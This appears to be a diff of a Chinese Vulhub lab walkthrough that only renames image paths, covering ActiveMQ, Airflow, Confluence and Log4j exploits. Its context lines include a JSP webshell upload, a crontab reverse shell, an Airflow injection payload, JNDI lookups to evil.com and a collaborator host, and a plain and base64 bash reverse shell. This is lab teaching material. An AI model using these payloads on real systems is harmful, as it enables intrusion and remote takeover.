@@ -56,7 +56,7 @@ cd ~/vulhub/activemq/CVE-2015-5254/ \
 
 > http://debian.local:8161/
 
-![访问](./../../../../../images/Vulhub1/activemq/ActiveMQ%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2015-5254%EF%BC%89/%E8%AE%BF%E9%97%AE.png)
+![访问](./../../../../../images/Vulhub/activemq/ActiveMQ%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2015-5254%EF%BC%89/%E8%AE%BF%E9%97%AE.png)
 
 查看容器 id
 
@@ -165,7 +165,7 @@ Java HotSpot(TM) 64-Bit Server VM (build 25.202-b08, mixed mode)
 > 密码：	admin
 >
 
-![查看这个队列中所有消息](./../../../../../images/Vulhub1/activemq/ActiveMQ%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2015-5254%EF%BC%89/%E6%9F%A5%E7%9C%8B%E8%BF%99%E4%B8%AA%E9%98%9F%E5%88%97%E4%B8%AD%E6%89%80%E6%9C%89%E6%B6%88%E6%81%AF.png)
+![查看这个队列中所有消息](./../../../../../images/Vulhub/activemq/ActiveMQ%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2015-5254%EF%BC%89/%E6%9F%A5%E7%9C%8B%E8%BF%99%E4%B8%AA%E9%98%9F%E5%88%97%E4%B8%AD%E6%89%80%E6%9C%89%E6%B6%88%E6%81%AF.png)
 
 > 点击查看这条消息即可触发命令执行
 
@@ -196,7 +196,7 @@ uid=0(root) gid=0(root) groups=0(root)
 
 > http://debian:8161/
 
-![访问](./../../../../../images/Vulhub1/activemq/ActiveMQ%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-3088%EF%BC%89/%E8%AE%BF%E9%97%AE.png)
+![访问](./../../../../../images/Vulhub/activemq/ActiveMQ%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-3088%EF%BC%89/%E8%AE%BF%E9%97%AE.png)
 
 [**写入 webshell**](https://github.com/vulhub/vulhub/blob/master/activemq/CVE-2016-3088/README.zh-cn.md#写入webshell)
 
@@ -206,7 +206,7 @@ uid=0(root) gid=0(root) groups=0(root)
 
 默认的 ActiveMQ 账号密码均为 admin，首先访问 `http://your-ip:8161/admin/test/systemProperties.jsp` ，查看 ActiveMQ 的绝对路径：
 
-![查看 ActiveMQ 的绝对路径](./../../../../../images/Vulhub1/activemq/ActiveMQ%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-3088%EF%BC%89/%E5%86%99%E5%85%A5%20webshell/%E6%9F%A5%E7%9C%8B%20ActiveMQ%20%E7%9A%84%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84.png)
+![查看 ActiveMQ 的绝对路径](./../../../../../images/Vulhub/activemq/ActiveMQ%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-3088%EF%BC%89/%E5%86%99%E5%85%A5%20webshell/%E6%9F%A5%E7%9C%8B%20ActiveMQ%20%E7%9A%84%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84.png)
 
 然后上传webshell：
 
@@ -243,7 +243,7 @@ Content-Length: 0
 
 访问 http://debian:8161/fileserver/ 
 
-![访问](./../../../../../images/Vulhub1/activemq/ActiveMQ%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-3088%EF%BC%89/%E5%86%99%E5%85%A5%20webshell/%E8%AE%BF%E9%97%AE.png)
+![访问](./../../../../../images/Vulhub/activemq/ActiveMQ%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-3088%EF%BC%89/%E5%86%99%E5%85%A5%20webshell/%E8%AE%BF%E9%97%AE.png)
 
 抓包，上传 webshell 
 
@@ -277,7 +277,7 @@ Content-Length: 450
 
 访问 http://debian:8161/fileserver/test.txt ，确认文件 test.txt 已经上传
 
-![确认文件 test.txt 已经上传](./../../../../../images/Vulhub1/activemq/ActiveMQ%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-3088%EF%BC%89/%E5%86%99%E5%85%A5%20webshell/%E7%A1%AE%E8%AE%A4%E6%96%87%E4%BB%B6%20test.txt%20%E5%B7%B2%E7%BB%8F%E4%B8%8A%E4%BC%A0.png)
+![确认文件 test.txt 已经上传](./../../../../../images/Vulhub/activemq/ActiveMQ%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-3088%EF%BC%89/%E5%86%99%E5%85%A5%20webshell/%E7%A1%AE%E8%AE%A4%E6%96%87%E4%BB%B6%20test.txt%20%E5%B7%B2%E7%BB%8F%E4%B8%8A%E4%BC%A0.png)
 
 移动到 `web` 目录下的 `api` 文件夹（`/opt/activemq/webapps/api/test.jsp`）中
 
@@ -305,13 +305,13 @@ Content-Length: 0
 >
 > 密码：		admin
 
-![确认文件 test.jsp 已经上传](./../../../../../images/Vulhub1/activemq/ActiveMQ%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-3088%EF%BC%89/%E5%86%99%E5%85%A5%20webshell/%E7%A1%AE%E8%AE%A4%E6%96%87%E4%BB%B6%20test.jsp%20%E5%B7%B2%E7%BB%8F%E4%B8%8A%E4%BC%A0.png)
+![确认文件 test.jsp 已经上传](./../../../../../images/Vulhub/activemq/ActiveMQ%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-3088%EF%BC%89/%E5%86%99%E5%85%A5%20webshell/%E7%A1%AE%E8%AE%A4%E6%96%87%E4%BB%B6%20test.jsp%20%E5%B7%B2%E7%BB%8F%E4%B8%8A%E4%BC%A0.png)
 
 验证
 
 > 指令：`http://debian:8161/api/test.jsp?pwd=023&i=[command]`
 
-![验证](./../../../../../images/Vulhub1/activemq/ActiveMQ%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-3088%EF%BC%89/%E5%86%99%E5%85%A5%20webshell/%E9%AA%8C%E8%AF%81.png)
+![验证](./../../../../../images/Vulhub/activemq/ActiveMQ%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2016-3088%EF%BC%89/%E5%86%99%E5%85%A5%20webshell/%E9%AA%8C%E8%AF%81.png)
 
 [**写入crontab，自动化弹shell**](https://github.com/vulhub/vulhub/blob/master/activemq/CVE-2016-3088/README.zh-cn.md#写入crontab自动化弹shell)
 
@@ -348,7 +348,7 @@ Content-Length: 0
 
 如果上述两个请求都返回 204 了，说明写入成功。等待反弹 shell ：
 
-![请求都返回204了，说明写入成功](./../../../../../images/Vulhub1/activemq/Apache Airflow 示例dag中的命令注入（CVE-2020-11978）/写入crontab，自动化弹shell/请求都返回204了，说明写入成功.png)
+![请求都返回204了，说明写入成功](./../../../../../images/Vulhub/activemq/Apache Airflow 示例dag中的命令注入（CVE-2020-11978）/写入crontab，自动化弹shell/请求都返回204了，说明写入成功.png)
 
 这个方法需要 ActiveMQ 是 root 运行，否则也不能写入 cron 文件。
 
@@ -438,7 +438,7 @@ uid=0(root) gid=0(root) groups=0(root)
 
 > http://debian:8080/
 
-![访问](./../../../../../images/Vulhub1/airflow/Apache%20Airflow%20%E7%A4%BA%E4%BE%8Bdag%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%EF%BC%88CVE-2020-11978%EF%BC%89/%E8%AE%BF%E9%97%AE.png)
+![访问](./../../../../../images/Vulhub/airflow/Apache%20Airflow%20%E7%A4%BA%E4%BE%8Bdag%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%EF%BC%88CVE-2020-11978%EF%BC%89/%E8%AE%BF%E9%97%AE.png)
 
 **利用过程**
 
@@ -448,11 +448,11 @@ uid=0(root) gid=0(root) groups=0(root)
 
 开启 example_trigger_target_dag 
 
-![开启 example_trigger_target_dag](./../../../../../images/Vulhub1/airflow/Apache%20Airflow%20%E7%A4%BA%E4%BE%8Bdag%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%EF%BC%88CVE-2020-11978%EF%BC%89/%E5%BC%80%E5%90%AF%20example_trigger_target_dag.png)
+![开启 example_trigger_target_dag](./../../../../../images/Vulhub/airflow/Apache%20Airflow%20%E7%A4%BA%E4%BE%8Bdag%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%EF%BC%88CVE-2020-11978%EF%BC%89/%E5%BC%80%E5%90%AF%20example_trigger_target_dag.png)
 
 进入 Trigger Dag 
 
-![进入 Trigger Dag](./../../../../../images/Vulhub1/airflow/Apache%20Airflow%20%E7%A4%BA%E4%BE%8Bdag%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%EF%BC%88CVE-2020-11978%EF%BC%89/%E8%BF%9B%E5%85%A5%20Trigger%20Dag.png)
+![进入 Trigger Dag](./../../../../../images/Vulhub/airflow/Apache%20Airflow%20%E7%A4%BA%E4%BE%8Bdag%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%EF%BC%88CVE-2020-11978%EF%BC%89/%E8%BF%9B%E5%85%A5%20Trigger%20Dag.png)
 
 在 Configuration JSON 中执行
 
@@ -460,11 +460,11 @@ uid=0(root) gid=0(root) groups=0(root)
 {"message":"'\";touch /tmp/airflow_dag_success;#"}
 ```
 
-![在 Configuration JSON 中执行](./../../../../../images/Vulhub1/airflow/Apache Airflow 示例dag中的命令注入（CVE-2020-11978）/在 Configuration JSON 中执行.png)
+![在 Configuration JSON 中执行](./../../../../../images/Vulhub/airflow/Apache Airflow 示例dag中的命令注入（CVE-2020-11978）/在 Configuration JSON 中执行.png)
 
 等待一段时间后可以看到执行成功
 
-![等待一段时间后可以看到执行成功](./../../../../../images/Vulhub1/airflow/Apache%20Airflow%20%E7%A4%BA%E4%BE%8Bdag%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%EF%BC%88CVE-2020-11978%EF%BC%89/%E7%AD%89%E5%BE%85%E4%B8%80%E6%AE%B5%E6%97%B6%E9%97%B4%E5%90%8E%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E6%89%A7%E8%A1%8C%E6%88%90%E5%8A%9F.png)
+![等待一段时间后可以看到执行成功](./../../../../../images/Vulhub/airflow/Apache%20Airflow%20%E7%A4%BA%E4%BE%8Bdag%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%EF%BC%88CVE-2020-11978%EF%BC%89/%E7%AD%89%E5%BE%85%E4%B8%80%E6%AE%B5%E6%97%B6%E9%97%B4%E5%90%8E%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E6%89%A7%E8%A1%8C%E6%88%90%E5%8A%9F.png)
 
 在 CeleryWorker 容器中进行查看
 
@@ -524,25 +524,25 @@ MuVMCwCFHeZ3JOJoKzCEUtvWFIZdz6iIm+YAhQ6V8YfoGYbNkH+VGW0YvclqrighQ==X02jb
 
 > Database type: `PostgreSQL` ,Setup type: `Simple` ,Hostname: `db`，Port: `5432` ,Database name: `confluence` ,Username: `postgres` ,Password: `123456` 
 
-![填写数据库信息](./../../../../../images/Vulhub1/confluence/Confluence%20%E5%B1%9E%E6%80%A7%E8%A6%86%E7%9B%96%E5%AF%BC%E8%87%B4%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%20(CVE-2023-22515)/%E5%A1%AB%E5%86%99%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF.png)
+![填写数据库信息](./../../../../../images/Vulhub/confluence/Confluence%20%E5%B1%9E%E6%80%A7%E8%A6%86%E7%9B%96%E5%AF%BC%E8%87%B4%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%20(CVE-2023-22515)/%E5%A1%AB%E5%86%99%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF.png)
 
 加载 Example Site
 
-![加载 Example Site](./../../../../../images/Vulhub1/confluence/Confluence 属性覆盖导致权限绕过漏洞 (CVE-2023-22515)/加载 Example Site.png)
+![加载 Example Site](./../../../../../images/Vulhub/confluence/Confluence 属性覆盖导致权限绕过漏洞 (CVE-2023-22515)/加载 Example Site.png)
 
 选择 Manage Users and Groups within Confluence
 
-![选择 Manage Users and Groups within Confluence](./../../../../../images/Vulhub1/confluence/Confluence%20%E5%B1%9E%E6%80%A7%E8%A6%86%E7%9B%96%E5%AF%BC%E8%87%B4%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%20(CVE-2023-22515)/%E9%80%89%E6%8B%A9%20Manage%20Users%20and%20Groups%20within%20Confluence.png)
+![选择 Manage Users and Groups within Confluence](./../../../../../images/Vulhub/confluence/Confluence%20%E5%B1%9E%E6%80%A7%E8%A6%86%E7%9B%96%E5%AF%BC%E8%87%B4%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%20(CVE-2023-22515)/%E9%80%89%E6%8B%A9%20Manage%20Users%20and%20Groups%20within%20Confluence.png)
 
 配置系统管理员帐户
 
 > Username: `admin` ,Name: `sec` ,Email: `sec@sec.com` ,Password: `123456` 
 
-![配置系统管理员帐户](./../../../../../images/Vulhub1/confluence/Confluence%20%E5%B1%9E%E6%80%A7%E8%A6%86%E7%9B%96%E5%AF%BC%E8%87%B4%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%20(CVE-2023-22515)/%E9%85%8D%E7%BD%AE%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%91%98%E5%B8%90%E6%88%B7.png)
+![配置系统管理员帐户](./../../../../../images/Vulhub/confluence/Confluence%20%E5%B1%9E%E6%80%A7%E8%A6%86%E7%9B%96%E5%AF%BC%E8%87%B4%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%20(CVE-2023-22515)/%E9%85%8D%E7%BD%AE%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%91%98%E5%B8%90%E6%88%B7.png)
 
 开始使用
 
-![开始使用](./../../../../../images/Vulhub1/confluence/Confluence%20%E5%B1%9E%E6%80%A7%E8%A6%86%E7%9B%96%E5%AF%BC%E8%87%B4%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%20(CVE-2023-22515)/%E5%BC%80%E5%A7%8B%E4%BD%BF%E7%94%A8.png)
+![开始使用](./../../../../../images/Vulhub/confluence/Confluence%20%E5%B1%9E%E6%80%A7%E8%A6%86%E7%9B%96%E5%AF%BC%E8%87%B4%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%20(CVE-2023-22515)/%E5%BC%80%E5%A7%8B%E4%BD%BF%E7%94%A8.png)
 
 创建一个空间
 
@@ -639,9 +639,9 @@ WARNING: server returned more data than it should - server is vulnerable!
 
 > Apache Log4j2 是 Java 语言的日志处理套件，使用极为广泛。在其 2.0 到 2.14.1 版本中存在一处 JNDI 注入漏洞，攻击者在可以控制日志内容的情况下，通过传入类似于 `${jndi:ldap://evil.com/example}` 的 lookup 用于进行 JNDI 注入，执行任意代码
 
-![渗透过程 (1)](./../../../../../images/Vulhub1/log4j/Apache%20Log4j2%20lookup%20JNDI%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-44228%EF%BC%89/%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B%20(1).png)
+![渗透过程 (1)](./../../../../../images/Vulhub/log4j/Apache%20Log4j2%20lookup%20JNDI%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-44228%EF%BC%89/%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B%20(1).png)
 
-![渗透过程 (2)](./../../../../../images/Vulhub1/log4j/Apache%20Log4j2%20lookup%20JNDI%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-44228%EF%BC%89/%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B%20(2).png)
+![渗透过程 (2)](./../../../../../images/Vulhub/log4j/Apache%20Log4j2%20lookup%20JNDI%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-44228%EF%BC%89/%E6%B8%97%E9%80%8F%E8%BF%87%E7%A8%8B%20(2).png)
 
 >漏洞环境
 >Apache Log4j2 是一个第三方库，可以通过使用了这个库的应用来复现这个漏洞，比如 Apache Solr
@@ -725,7 +725,7 @@ msf6 auxiliary(scanner/http/log4shell_scanner) > run
 
 检测出存在 log4j2 漏洞
 
-![检测出存在 log4j2 漏洞](./../../../../../images/Vulhub1/log4j/Apache Log4j2 lookup JNDI 注入漏洞（CVE-2021-44228）/检测出存在 log4j2 漏洞.png)
+![检测出存在 log4j2 漏洞](./../../../../../images/Vulhub/log4j/Apache Log4j2 lookup JNDI 注入漏洞（CVE-2021-44228）/检测出存在 log4j2 漏洞.png)
 
 **数据外带**
 
@@ -755,11 +755,11 @@ Connection: close
 
 打开 Burpsuite，进入  Burp Collaborator 
 
-![打开 Burpsuite，进入  Burp Collaborator ](./../../../../../images/Vulhub1/log4j/Apache%20Log4j2%20lookup%20JNDI%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-44228%EF%BC%89/%E6%89%93%E5%BC%80%20Burpsuite%EF%BC%8C%E8%BF%9B%E5%85%A5%20%20Burp%20Collaborator%20.png)
+![打开 Burpsuite，进入  Burp Collaborator ](./../../../../../images/Vulhub/log4j/Apache%20Log4j2%20lookup%20JNDI%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-44228%EF%BC%89/%E6%89%93%E5%BC%80%20Burpsuite%EF%BC%8C%E8%BF%9B%E5%85%A5%20%20Burp%20Collaborator%20.png)
 
 点击，复制一个 url 地址
 
-![点击，复制一个 url 地址](./../../../../../images/Vulhub1/log4j/Apache%20Log4j2%20lookup%20JNDI%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-44228%EF%BC%89/%E7%82%B9%E5%87%BB%EF%BC%8C%E5%A4%8D%E5%88%B6%E4%B8%80%E4%B8%AA%20url%20%E5%9C%B0%E5%9D%80.png)
+![点击，复制一个 url 地址](./../../../../../images/Vulhub/log4j/Apache%20Log4j2%20lookup%20JNDI%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-44228%EF%BC%89/%E7%82%B9%E5%87%BB%EF%BC%8C%E5%A4%8D%E5%88%B6%E4%B8%80%E4%B8%AA%20url%20%E5%9C%B0%E5%9D%80.png)
 
 ```
 bn2sdf6d1h8qdh8t8805xefxjopfd91y.oastify.com
@@ -783,29 +783,29 @@ Connection: close
 
 粘贴请求包至重放器
 
-![粘贴请求包至重放器](./../../../../../images/Vulhub1/log4j/Apache%20Log4j2%20lookup%20JNDI%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-44228%EF%BC%89/%E7%B2%98%E8%B4%B4%E8%AF%B7%E6%B1%82%E5%8C%85%E8%87%B3%E9%87%8D%E6%94%BE%E5%99%A8.png)
+![粘贴请求包至重放器](./../../../../../images/Vulhub/log4j/Apache%20Log4j2%20lookup%20JNDI%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-44228%EF%BC%89/%E7%B2%98%E8%B4%B4%E8%AF%B7%E6%B1%82%E5%8C%85%E8%87%B3%E9%87%8D%E6%94%BE%E5%99%A8.png)
 
 对 ${ } 及其内容进行 URL 编码
 
-![对 ${ } 及其内容进行 URL 编码](./../../../../../images/Vulhub1/log4j/Apache%20Log4j2%20lookup%20JNDI%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-44228%EF%BC%89/%E5%AF%B9%20$%7B%20%7D%20%E5%8F%8A%E5%85%B6%E5%86%85%E5%AE%B9%E8%BF%9B%E8%A1%8C%20URL%20%E7%BC%96%E7%A0%81.png)
+![对 ${ } 及其内容进行 URL 编码](./../../../../../images/Vulhub/log4j/Apache%20Log4j2%20lookup%20JNDI%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-44228%EF%BC%89/%E5%AF%B9%20$%7B%20%7D%20%E5%8F%8A%E5%85%B6%E5%86%85%E5%AE%B9%E8%BF%9B%E8%A1%8C%20URL%20%E7%BC%96%E7%A0%81.png)
 
 在末尾空两行
 
-![在末尾空两行](./../../../../../images/Vulhub1/log4j/Apache%20Log4j2%20lookup%20JNDI%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-44228%EF%BC%89/%E5%9C%A8%E6%9C%AB%E5%B0%BE%E7%A9%BA%E4%B8%A4%E8%A1%8C.png)
+![在末尾空两行](./../../../../../images/Vulhub/log4j/Apache%20Log4j2%20lookup%20JNDI%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-44228%EF%BC%89/%E5%9C%A8%E6%9C%AB%E5%B0%BE%E7%A9%BA%E4%B8%A4%E8%A1%8C.png)
 
 点击发送配置目标 IP 和端口
 
-![点击发送配置目标 IP 和端口](./../../../../../images/Vulhub1/log4j/Apache%20Log4j2%20lookup%20JNDI%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-44228%EF%BC%89/%E7%82%B9%E5%87%BB%E5%8F%91%E9%80%81%E9%85%8D%E7%BD%AE%E7%9B%AE%E6%A0%87%20IP%20%E5%92%8C%E7%AB%AF%E5%8F%A3.png)
+![点击发送配置目标 IP 和端口](./../../../../../images/Vulhub/log4j/Apache%20Log4j2%20lookup%20JNDI%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-44228%EF%BC%89/%E7%82%B9%E5%87%BB%E5%8F%91%E9%80%81%E9%85%8D%E7%BD%AE%E7%9B%AE%E6%A0%87%20IP%20%E5%92%8C%E7%AB%AF%E5%8F%A3.png)
 
 再次点击发送
 
-![再次点击发送](./../../../../../images/Vulhub1/log4j/Apache%20Log4j2%20lookup%20JNDI%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-44228%EF%BC%89/%E5%86%8D%E6%AC%A1%E7%82%B9%E5%87%BB%E5%8F%91%E9%80%81.png)
+![再次点击发送](./../../../../../images/Vulhub/log4j/Apache%20Log4j2%20lookup%20JNDI%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-44228%EF%BC%89/%E5%86%8D%E6%AC%A1%E7%82%B9%E5%87%BB%E5%8F%91%E9%80%81.png)
 
 > 看到响应包反馈为失败，但是可以得到结果
 
 在 Collaborator 中查看轮询结果
 
-![在 Collaborator 中查看轮询结果](./../../../../../images/Vulhub1/log4j/Apache%20Log4j2%20lookup%20JNDI%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-44228%EF%BC%89/%E5%9C%A8%20Collaborator%20%E4%B8%AD%E6%9F%A5%E7%9C%8B%E8%BD%AE%E8%AF%A2%E7%BB%93%E6%9E%9C.png)
+![在 Collaborator 中查看轮询结果](./../../../../../images/Vulhub/log4j/Apache%20Log4j2%20lookup%20JNDI%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-44228%EF%BC%89/%E5%9C%A8%20Collaborator%20%E4%B8%AD%E6%9F%A5%E7%9C%8B%E8%BD%AE%E8%AF%A2%E7%BB%93%E6%9E%9C.png)
 
 > 可以看到目标 java 的版本为 1.8.0
 
@@ -850,7 +850,7 @@ Connection: close
 [root@centos ~]# bash -i >& /dev/tcp/kali.local/4444 0>&1
 ```
 
-![在目标上执行反弹 shell 脚本](./../../../../../images/Vulhub1/log4j/Apache%20Log4j2%20lookup%20JNDI%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-44228%EF%BC%89/%E5%9C%A8%E7%9B%AE%E6%A0%87%E4%B8%8A%E6%89%A7%E8%A1%8C%E5%8F%8D%E5%BC%B9%20shell%20%E8%84%9A%E6%9C%AC.png)
+![在目标上执行反弹 shell 脚本](./../../../../../images/Vulhub/log4j/Apache%20Log4j2%20lookup%20JNDI%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-44228%EF%BC%89/%E5%9C%A8%E7%9B%AE%E6%A0%87%E4%B8%8A%E6%89%A7%E8%A1%8C%E5%8F%8D%E5%BC%B9%20shell%20%E8%84%9A%E6%9C%AC.png)
 
 `拿到权限。`
 
@@ -860,7 +860,7 @@ Connection: close
 YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjYuMjQvNDQ0NCAwPiYx
 ```
 
-![对脚本进行 base64 编码](./../../../../../images/Vulhub1/log4j/Apache%20Log4j2%20lookup%20JNDI%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-44228%EF%BC%89/%E5%AF%B9%E8%84%9A%E6%9C%AC%E8%BF%9B%E8%A1%8C%20base64%20%E7%BC%96%E7%A0%81.png)
+![对脚本进行 base64 编码](./../../../../../images/Vulhub/log4j/Apache%20Log4j2%20lookup%20JNDI%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-44228%EF%BC%89/%E5%AF%B9%E8%84%9A%E6%9C%AC%E8%BF%9B%E8%A1%8C%20base64%20%E7%BC%96%E7%A0%81.png)
 
 echo 命令输出 base64 字符串传递给 base64 -d 进行解码
 
@@ -906,7 +906,7 @@ bash -c "{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjYuMjQvNDQ0NCAwPiYx}|{base64
 
  >使用工具启动 LDAP 或 RMI 服务时，把反弹 shell 脚本指定为 LDAP 或 RMI 服务所提供的恶意代码所执行的系统命令，JNDI 远程加载 LDAP 或 RMI 服务端提供的恶意代码并执行，会触发反弹 shell 脚本建立会话。
 
-![执行 JNDI 注入攻击的 jar 文件](./../../../../../images/Vulhub1/log4j/Apache%20Log4j2%20lookup%20JNDI%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-44228%EF%BC%89/%E6%89%A7%E8%A1%8C%20JNDI%20%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E7%9A%84%20jar%20%E6%96%87%E4%BB%B6.png)
+![执行 JNDI 注入攻击的 jar 文件](./../../../../../images/Vulhub/log4j/Apache%20Log4j2%20lookup%20JNDI%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-44228%EF%BC%89/%E6%89%A7%E8%A1%8C%20JNDI%20%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB%E7%9A%84%20jar%20%E6%96%87%E4%BB%B6.png)
 
 > 根据版本号选择链接
 
@@ -936,7 +936,7 @@ http://debian:8983/solr/admin/cores?action=%24%7b%6a%6e%64%69%3a%6c%64%61%70%3a%
 └─# curl http://debian:8983/solr/admin/cores?action=%24%7b%6a%6e%64%69%3a%6c%64%61%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%36%2e%32%34%3a%31%33%38%39%2f%6c%68%75%6d%61%74%7d
 ```
 
-![执行 payload](./../../../../../images/Vulhub1/log4j/Apache%20Log4j2%20lookup%20JNDI%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-44228%EF%BC%89/%E6%89%A7%E8%A1%8C%20payload.png)
+![执行 payload](./../../../../../images/Vulhub/log4j/Apache%20Log4j2%20lookup%20JNDI%20%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-44228%EF%BC%89/%E6%89%A7%E8%A1%8C%20payload.png)
 
 `成功接收到 shell。` 
 
